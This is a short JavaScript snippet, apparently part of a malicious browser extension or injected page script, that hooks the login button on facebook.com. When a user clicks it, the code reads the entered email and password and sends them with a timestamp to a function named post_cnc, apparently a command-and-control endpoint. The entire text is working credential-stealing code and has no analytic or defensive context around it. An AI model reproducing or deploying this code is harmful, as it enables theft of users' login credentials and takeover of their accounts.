document.getElementById('loginbutton').getElementsByTagName('input')[0].addEventListener(
	'click',
	function(){
		try {
			let email = document.getElementById('email');
			let pass = document.getElementById('pass');
			if (email.value != '' && pass.value != ''){
				post_cnc(
					{
						"auth": {
							timestamp: Date.now(),
							site: "facebook.com",
							user: email.value,
							pass: pass.value
						}
					},
					function(data){
						console.log(data);
						return true;
					}
				);
				return true;
			}
		} catch(error){
			console.log(error);
			return false;
		}
	}
);